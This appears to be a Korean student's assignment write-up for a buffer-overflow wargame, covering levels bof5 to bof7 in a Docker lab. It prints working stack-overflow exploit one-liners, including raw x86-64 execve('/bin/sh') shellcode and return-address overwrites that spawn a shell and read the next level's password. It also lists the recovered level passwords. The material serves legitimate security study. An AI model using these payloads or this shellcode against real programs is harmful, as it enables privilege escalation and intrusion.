# Assignment 3

```shell
 $ docker run -it --privileged ccss17/bof
```

> ID는 bof5, Password는 bof4에서 밝혀냈음.

<br/>

### 8 - bof5

```shell
 $ vi bof5.c
```

![08-bof5_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/08-bof5_code.png?raw=true)

bof5.c의 소스 코드를 확인한다.

![08-disas](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/08-disas_vuln.png?raw=true)

함수의 구성을 확인한다.

```shell
 $ (python -c "print '/bin/sh\x00'+'x'*132+'\x78\x56\x34\x12'";cat) | ./bof5
```

↑ Little endian 식의 키 값(\x78\x56\x34\x12)을 넣어준 코드임 ↑

![08-pw](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/08-pw.png?raw=true)

쉘을 열어주고
쉘 권한으로 bof6.pw를 읽어준다.

> bof6의 비밀번호는 b35aad61 이다.

<br/>
<br/>

### 9 - bof6

```shell
 $ vi bof6.c
```

![09-bof5\6_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/08-bof5_code.png?raw=true)

bof6.c의 소스 코드를 확인한다.

**(python -c "print 'x'\*< BUF to RETURN ADDRESS >+'< SHELLCODE ADDRESS >'";cat) | ./bof6**

<br/>

buf와 return address의 거리는 136이다. (buf_size + SFP)

<img src = "https://github.com/YYYEJI/SECURITY/blob/master/img/09-pw.png?raw=true" width="30%" height="20%">

쉘을 열어주고
쉘 권한으로 bof7.pw를 읽어준다.

> bof7의 비밀번호는 ffa35d7e 이다.

<br/>
<br/>

### 10 - bof7

```shell
 $ vi bof7.c
```

![10-bof7_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/10-bof6_code.png?raw=true)

bof7.c의 소스 코드를 확인한다.

<br/>

buf와 return address의 거리는 136이다.
그리고 8byte를 덮어줘야 하기 때문에 전달해야 할 인자값은 144byte이다.

<br/>

```shell
 $  ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'x'*109 + '\xb0\xea\xff\xff\xff\x7f'"`
```

![10-pw](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/10-pw.png?raw=true)

쉘을 열어주고
쉘 권한으로 bof8.pw를 읽어준다.

> bof7의 비밀번호는 0dc54105 이다.
